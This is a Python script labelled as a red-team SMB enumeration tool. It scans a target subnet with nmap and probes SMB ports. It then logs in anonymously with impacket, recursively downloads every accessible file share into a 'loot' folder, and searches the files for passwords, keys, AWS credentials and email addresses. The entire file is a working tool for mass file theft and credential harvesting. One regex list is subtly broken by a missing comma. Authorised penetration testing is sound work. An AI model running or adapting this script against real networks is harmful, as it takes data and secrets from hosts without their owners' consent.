#!/usr/bin/env python3

Intro_art = """

````````````````````````````````````````
````````````ADD ASCII ART HERE``````````
````````````````````````````````````````

SMB Enumeration Automation
Author: Sanalnadh M Kattungal
Envestnet Offensive Security [RED TEAM]

"""

import os
import re
import socket
import subprocess
from datetime import datetime
from impacket.smbconnection import SMBConnection

# === CONFIGURATION ===
TARGET_SUBNET = '10.10.162.18' # //// MODIFY TARGET SUBNET BEFORE EXECUTION ////
# TARGET_SUBNET = '192.168.1.0/24' # //// MODIFY TARGET SUBNET BEFORE EXECUTION ////
SMB_PORTS = [445, 139]
LOOT_DIR = 'smb_loot'
NMAP_PATH = 'nmap'  # Works on Kali machine, need tweaks to run on windows

# Add more patterns later on for improved usage. Need Modifications
SENSITIVE_PATTERNS = [
    r'password\s*[:=]\s*\S+',
    r'username\s*[:=]\s*\S+',
    r'pass\s*[:=]\s*\S+',
    r'key\s*[:=]\s*\S+',
    r'aws_access_key_id\s*=\s*\S+',
    r'aws_secret_access_key\s*=\s*\S+'
    r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
]

live_hosts = []
smb_hosts = []
loot_files = []

def check_nmap():
    '''Checks whether the nmap is installed in the attacker host machine'''
    print('[*] Checking if Nmap is installed...')
    try:
        subprocess.run([NMAP_PATH, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        print('[+] Nmap is available.')
    except Exception:
        print('[-] Nmap is not installed or not in PATH. Please install Nmap and try again.')
        exit(1)

def discover_hosts(subnet):
    '''Discover live hosts in the subnet of the attacker machine and prints the number of live hosts'''
    print(f'[+] Discovering live hosts in {subnet}')
    try:
        result = subprocess.check_output(f'{NMAP_PATH} -sn {subnet}', shell=True).decode(errors='ignore')
        hosts = re.findall(r'Nmap scan report for ([\d\.]+)', result)
        print(f'[+] Found {len(hosts)} live hosts')
        return hosts
    except Exception as e:
        print(f'[-] Error running Nmap scan: {e}')
        return []

def check_smb_ports(hosts):
    ''' Check for open SMB ports in the live hosts in the subnet of attacker machine'''
    print(f'[+] Scanning for SMB ports on live hosts')
    smb_alive = []
    for host in hosts:
        for port in SMB_PORTS:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                sock.connect((host, port))
                print(f'[+] {host}:{port} is open (SMB)')
                smb_alive.append(host)
                break
            except:
                continue
            finally:
                sock.close()
    print(f'[+] {len(set(smb_alive))} hosts have SMB ports open')
    return list(set(smb_alive))

def dump_smb_shares(host):
    '''Recursively try to enumerate all the files from the open SMB File Shares'''
    print(f'[+] Enumerating shares on {host}')
    try:
        conn = SMBConnection(host, host, sess_port=445, timeout=3)
        conn.login('', '')  # Anonymous login
        shares = conn.listShares()
        for share in shares:
            share_name = share['shi1_netname'][:-1]
            if share_name in ['NETLOGON', 'SYSVOL', 'IPC$']:
                continue
            print(f'[+] Found share: {share_name}')
            download_share_files(conn, host, share_name)
        conn.close()
    except Exception as e:
        print(f'[-] Failed to enumerate {host}: {e}')

def download_share_files(conn, host, share_name):
    ''' Create local directories for the downloads'''
    remote_path = '\\'
    local_base = os.path.join(LOOT_DIR, host, share_name)
    os.makedirs(local_base, exist_ok=True)

    def recursive_download(remote_dir, local_dir):
        '''Recursively dumps all the files that can be downloaded from open SMB File Shares to local directory'''
        try:
            files = conn.listPath(share_name, remote_dir + '*')
            for f in files:
                filename = f.get_longname()
                if filename in ['.', '..']:
                    continue
                remote_file_path = remote_dir + filename
                local_file_path = os.path.join(local_dir, filename)

                if f.is_directory():
                    os.makedirs(local_file_path, exist_ok=True)
                    recursive_download(remote_file_path + '\\', local_file_path)
                else:
                    print(f'[+] Downloading {remote_file_path}')
                    try:
                        with open(local_file_path, 'wb') as fp:
                            conn.getFile(share_name, remote_file_path, fp.write)
                        loot_files.append(local_file_path)
                    except Exception as e:
                        print(f'[-] Failed to download {remote_file_path}: {e}')
        except Exception as e:
            print(f'[-] Could not list {remote_dir}: {e}')

    recursive_download(remote_path, local_base)

def search_sensitive_data(files):
    '''Search for sensitive contents from the looted files and documents'''
    findings = []
    print(f'[+] Searching for sensitive data in looted files')
    for file in files:
        try:
            with open(file, 'r', errors='ignore') as f:
                content = f.read()
                for pattern in SENSITIVE_PATTERNS:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        findings.append((file, match))
        except:
            continue
    print(f'[+] Found {len(findings)} sensitive items')
    return findings

def generate_report(findings): # TODO: Need to work on this
    '''Generate report is there were  critical/sensitive information found in the dumped files'''
    report_file = f'report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    try:
        with open(report_file, 'w') as f:
            for file, match in findings:
                f.write(f'{file}: {match}\n')
        print(f'[+] Report generated: {report_file}')
    except Exception as e:
        print(f'[-] Failed to write report: {e}')

def main():
    print(Intro_art)
    check_nmap()
    hosts = discover_hosts(TARGET_SUBNET)
    if not hosts:
        print('[-] No live hosts found. Exiting.')
        return
    smb_targets = check_smb_ports(hosts)
    if not smb_targets:
        print('[-] No SMB-enabled hosts found. Exiting.')
        return
    for target in smb_targets:
        dump_smb_shares(target)
    if not loot_files:
        print('[-] No files looted from shares.')
        return
    sensitive_findings = search_sensitive_data(loot_files)
    if sensitive_findings:
        for file, match in sensitive_findings:
            print(f'{file}: {match}')
        generate_report(sensitive_findings)
    else:
        print('[-] No sensitive items found.')

if __name__ == '__main__':
    main()


# END
